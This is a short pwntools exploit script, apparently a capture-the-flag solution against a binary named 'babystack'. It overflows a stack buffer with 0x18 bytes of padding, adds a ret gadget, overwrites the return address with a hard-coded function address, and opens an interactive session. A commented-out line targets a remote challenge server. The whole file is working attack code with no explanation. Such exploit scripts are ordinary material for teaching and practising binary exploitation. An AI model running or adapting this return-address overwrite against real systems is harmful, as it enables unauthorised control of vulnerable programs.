from pwn import *

elf=ELF('./babystack')

io=process('./babystack')
# io=remote("1.14.71.254",28204)
io.sendline(b'100')
ret_addr=0x400561
func_addr=0x4006E6
# payload=cyclic(0x18)+p64(func_addr)
payload=cyclic(0x18)+p64(ret_addr)+p64(func_addr)
io.sendline(payload)
io.interactive()